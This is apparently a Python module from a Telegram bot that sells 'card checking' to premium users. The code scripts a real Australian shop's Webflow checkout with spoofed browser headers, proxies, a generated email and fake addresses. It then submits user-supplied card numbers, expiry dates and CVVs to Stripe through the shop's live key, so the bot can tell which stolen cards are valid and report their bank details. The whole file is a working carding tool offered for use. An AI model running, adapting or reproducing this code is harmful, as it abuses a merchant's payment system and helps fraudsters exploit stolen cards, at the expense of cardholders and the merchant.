import uuid
from aiohttp import ClientSession
import time, asyncio
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
from src.extras.checklib import MakeGate, ScrapInfo

name_gate = "Stripe_Auth"
subtype = "No charged has been made."
command = "st"


@Client.on_message(
    filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False)
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    asyncio.gather(await get_live(card, msg))


async def get_live(card, msg):
    email = ScrapInfo().email_generator()
    proxy = ScrapInfo().proxy_session()

    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_split = MakeGate(card).get_card_details()
    ccn = card_split[0]
    month = card_split[1]
    year = card_split[2]
    if len(year) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]

    initial_time = time.time()
    data_bin = await MakeGate(card).bin_lookup()
    session = ClientSession()

    headers = {
        "authority": "www.waterpeople.com.au",
        "accept": "*/*",
        "accept-language": "es-419,es;q=0.7",
        "origin": "https://www.waterpeople.com.au",
        "referer": "https://www.waterpeople.com.au/product/john-guest-straight-adaptor-bspt-thread-1-4-x-1-4",
        "sec-ch-ua": '"Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }

    response = await session.post(
        "https://www.waterpeople.com.au/.wf_graphql/csrf",
        headers=headers,
        ssl=False,
        proxy=proxy,
    )

    csfr = response.cookies["wf-csrf"].value

    current_time = datetime.now().strftime("%D - %H:%M:%S")
    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccn}:{month}:{year}:{cvv}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    headers = {
        "authority": "www.waterpeople.com.au",
        "accept": "*/*, application/json",
        "accept-language": "es-419,es;q=0.7",
        "content-type": "application/json",
        "origin": "https://www.waterpeople.com.au",
        "referer": "https://www.waterpeople.com.au/product/john-guest-straight-adaptor-bspt-thread-1-4-x-1-4",
        "sec-ch-ua": '"Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-wf-csrf": csfr,
    }

    json_data = [
        {
            "operationName": "AddToCart",
            "variables": {
                "skuId": "64d060c9e249bc477190cf18",
                "count": 1,
                "buyNow": False,
            },
            "query": "mutation AddToCart($skuId: String!, $count: Int!, $buyNow: Boolean) {\n  ecommerceAddToCart(sku: $skuId, count: $count, buyNow: $buyNow) {\n    ok\n    itemId\n    itemCount\n    itemPrice {\n      unit\n      decimalValue\n      __typename\n    }\n    __typename\n  }\n}\n",
        },
    ]

    response = await session.post(
        "https://www.waterpeople.com.au/.wf_graphql/apollo",
        headers=headers,
        json=json_data,
        ssl=False,
        # proxy=proxy,
    )

    headers = {
        "authority": "www.waterpeople.com.au",
        "accept": "*/*, application/json",
        "accept-language": "es-419,es;q=0.7",
        "content-type": "application/json",
        "origin": "https://www.waterpeople.com.au",
        "referer": "https://www.waterpeople.com.au/checkout",
        "sec-ch-ua": '"Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-wf-csrf": csfr,
    }

    json_data = [
        {
            "operationName": "CheckoutUpdateOrderIdentity",
            "variables": {
                "email": email,
            },
            "query": "mutation CheckoutUpdateOrderIdentity($email: String) {\n  ecommerceUpdateIdentity(email: $email) {\n    ok\n    __typename\n  }\n}\n",
        },
    ]

    response = await session.post(
        "https://www.waterpeople.com.au/.wf_graphql/apollo",
        headers=headers,
        json=json_data,
        ssl=False,
        # proxy=proxy,
    )

    headers = {
        "authority": "www.waterpeople.com.au",
        "accept": "*/*, application/json",
        "accept-language": "es-419,es;q=0.7",
        "content-type": "application/json",
        "origin": "https://www.waterpeople.com.au",
        "referer": "https://www.waterpeople.com.au/checkout",
        "sec-ch-ua": '"Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-wf-csrf": csfr,
    }

    json_data = [
        {
            "operationName": "CheckoutUpdateOrderAddress",
            "variables": {
                "type": "shipping",
                "name": "edf fgdgs",
                "address_line1": "11 Actil Ave",
                "address_line2": None,
                "address_city": "Woodville",
                "address_state": "South Australia",
                "address_zip": "5011",
                "address_country": "AU",
                "PageURL": "https://www.waterpeople.com.au/checkout",
            },
            "query": "mutation CheckoutUpdateOrderAddress($type: String!, $name: String, $address_line1: String, $address_line2: String, $address_city: String, $address_state: String, $address_country: String, $address_zip: String) {\n  ecommerceUpdateAddress(type: $type, addressee: $name, line1: $address_line1, line2: $address_line2, city: $address_city, state: $address_state, country: $address_country, postalCode: $address_zip) {\n    ok\n    __typename\n  }\n}\n",
        },
    ]

    response = await session.post(
        "https://www.waterpeople.com.au/.wf_graphql/apollo",
        headers=headers,
        json=json_data,
        ssl=False,
        # proxy=proxy,
    )

    headers = {
        "authority": "www.waterpeople.com.au",
        "accept": "*/*, application/json",
        "accept-language": "es-419,es;q=0.7",
        "content-type": "application/json",
        "origin": "https://www.waterpeople.com.au",
        "referer": "https://www.waterpeople.com.au/checkout",
        "sec-ch-ua": '"Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-wf-csrf": csfr,
    }

    json_data = [
        {
            "operationName": "CheckoutUpdateOrderIdentity",
            "variables": {
                "email": email,
            },
            "query": "mutation CheckoutUpdateOrderIdentity($email: String) {\n  ecommerceUpdateIdentity(email: $email) {\n    ok\n    __typename\n  }\n}\n",
        },
        {
            "operationName": "CheckoutUpdateOrderAddress",
            "variables": {
                "type": "billing",
                "name": "edf fgdgs",
                "address_line1": "11 Actil Ave",
                "address_line2": None,
                "address_city": "Woodville",
                "address_state": "South Australia",
                "address_zip": "5011",
                "address_country": "AU",
                "PageURL": "https://www.waterpeople.com.au/checkout",
            },
            "query": "mutation CheckoutUpdateOrderAddress($type: String!, $name: String, $address_line1: String, $address_line2: String, $address_city: String, $address_state: String, $address_country: String, $address_zip: String) {\n  ecommerceUpdateAddress(type: $type, addressee: $name, line1: $address_line1, line2: $address_line2, city: $address_city, state: $address_state, country: $address_country, postalCode: $address_zip) {\n    ok\n    __typename\n  }\n}\n",
        },
        {
            "operationName": "CheckoutUpdateOrderAddress",
            "variables": {
                "type": "shipping",
                "name": "edf fgdgs",
                "address_line1": "11 Actil Ave",
                "address_line2": None,
                "address_city": "Woodville",
                "address_state": "South Australia",
                "address_zip": "5011",
                "address_country": "AU",
                "PageURL": "https://www.waterpeople.com.au/checkout",
            },
            "query": "mutation CheckoutUpdateOrderAddress($type: String!, $name: String, $address_line1: String, $address_line2: String, $address_city: String, $address_state: String, $address_country: String, $address_zip: String) {\n  ecommerceUpdateAddress(type: $type, addressee: $name, line1: $address_line1, line2: $address_line2, city: $address_city, state: $address_state, country: $address_country, postalCode: $address_zip) {\n    ok\n    __typename\n  }\n}\n",
        },
        {
            "operationName": "CheckoutUpdateShippingMethod",
            "variables": {
                "id": "6369c3b808d4c9f4caeedc6f",
            },
            "query": "mutation CheckoutUpdateShippingMethod($id: String) {\n  ecommerceUpdateShippingMethod(methodId: $id) {\n    ok\n    __typename\n  }\n}\n",
        },
        {
            "operationName": "CheckoutUpdateCustomData",
            "variables": {
                "customData": [
                    {
                        "name": "Telephone",
                        "textInput": "5515789632",
                    },
                    {
                        "name": "PageURL",
                        "textInput": "https://www.waterpeople.com.au/checkout",
                    },
                ],
            },
            "query": "mutation CheckoutUpdateCustomData($customData: [mutation_commerce_update_custom_data]!) {\n  ecommerceUpdateCustomData(customData: $customData) {\n    ok\n    __typename\n  }\n}\n",
        },
    ]

    response = await session.post(
        "https://www.waterpeople.com.au/.wf_graphql/apollo",
        headers=headers,
        json=json_data,
        ssl=False,
        # proxy=proxy,
    )

    headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "accept-language": "es-419,es;q=0.7",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    }

    data = f"type=card&billing_details[name]=edf+fgdgs&billing_details[email]={email}&billing_details[address][line1]=11+Actil+Ave&billing_details[address][city]=Woodville&billing_details[address][state]=South+Australia&billing_details[address][country]=AU&billing_details[address][postal_code]=5011&card[number]={ccn}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F0f0e589f46%3B+stripe-js-v3%2F0f0e589f46%3B+split-card-element&referrer=https%3A%2F%2Fwww.waterpeople.com.au&time_on_page=238388&key=pk_live_nyPnaDuxaj8zDxRbuaPHJjip&_stripe_account=acct_1FYL7jKoEF2fmzZz&_stripe_version=2020-03-02"

    response = await session.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=headers,
        data=data,
        ssl=False,
        # proxy=proxy,
    )
    response_data = await response.json()
    ide = response_data["id"]

    headers = {
        "authority": "www.waterpeople.com.au",
        "accept": "*/*, application/json",
        "accept-language": "es-419,es;q=0.7",
        "content-type": "application/json",
        "origin": "https://www.waterpeople.com.au",
        "referer": "https://www.waterpeople.com.au/checkout",
        "sec-ch-ua": '"Not A(Brand";v="99", "Brave";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-wf-csrf": csfr,
    }

    json_data = [
        {
            "operationName": "CheckoutUpdateStripePaymentMethod",
            "variables": {
                "paymentMethod": ide,
            },
            "query": "mutation CheckoutUpdateStripePaymentMethod($paymentMethod: String!) {\n  ecommerceStoreStripePaymentMethod(paymentMethod: $paymentMethod) {\n    ok\n    __typename\n  }\n}\n",
        },
    ]

    response = await session.post(
        "https://www.waterpeople.com.au/.wf_graphql/apollo",
        headers=headers,
        json=json_data,
        ssl=False,
        # proxy=proxy,
    )

    text = await response.text()
    if '"ok":true,"' in text:
        msgx = "Approved"
    else:
        msgx = (
            text.split('"message":"')[1]
            .split('"')[0]
            .replace("Stripe rejected the request: ", "")
            .strip()
        )
        code = text.split('"stripeCode":"')[1].split('"')[0]
        final_time = time.time() - initial_time

        card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {code}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
        await msg.edit_text(
            card_response,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

        await session.close()
